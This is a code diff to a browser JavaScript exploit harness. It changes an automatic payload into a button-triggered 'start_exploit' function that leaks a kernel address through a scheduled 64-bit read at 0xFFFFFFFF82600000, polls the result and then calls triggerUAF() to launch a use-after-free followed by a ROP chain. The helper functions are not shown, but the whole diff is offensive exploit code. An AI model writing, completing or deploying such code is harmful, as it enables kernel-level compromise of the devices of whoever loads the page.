@@ -1,16 +1,14 @@
-// payload.js
-
 window.read_target = new Uint8Array(8);
 
-function run_payload() {
-  debug_log("Payload started. Preparing to leak kernel address...");
+function start_exploit() {
+  debug_log("Starting exploit manually...");
 
-  // Fill known marker
+  // Fill marker
   for (let i = 0; i < 8; i++) read_target[i] = 0xAA;
 
   schedule_read64(0xFFFFFFFF82600000);
 
-  // Start polling immediately
+  // Start polling
   let tries = 0;
   const view = new DataView(read_target.buffer);
   const interval = setInterval(() => {
@@ -27,15 +25,19 @@ function run_payload() {
     }
   }, 200);
 
-  // Add button for manual trigger
-  const btn = document.createElement("button");
-  btn.textContent = "▶️ Trigger ROP";
-  btn.style.fontSize = "20px";
-  btn.onclick = () => {
-    debug_log("🔥 Launching UAF → ROP...");
-    triggerUAF();
-  };
-  document.body.appendChild(btn);
-} 
+  // Now trigger exploit
+  debug_log("🔥 Launching UAF → ROP...");
+  triggerUAF();
+}
 
-window.onload = run_payload;
+window.onload = () => {
+  debug_log("Page loaded. Click the button to begin.");
+
+  const btn = document.createElement("button");
+  btn.textContent = "▶️ Start Exploit";
+  btn.style.fontSize = "24px";
+  btn.style.padding = "10px 20px";
+  btn.onclick = start_exploit;
+
+  document.body.appendChild(btn);
+};
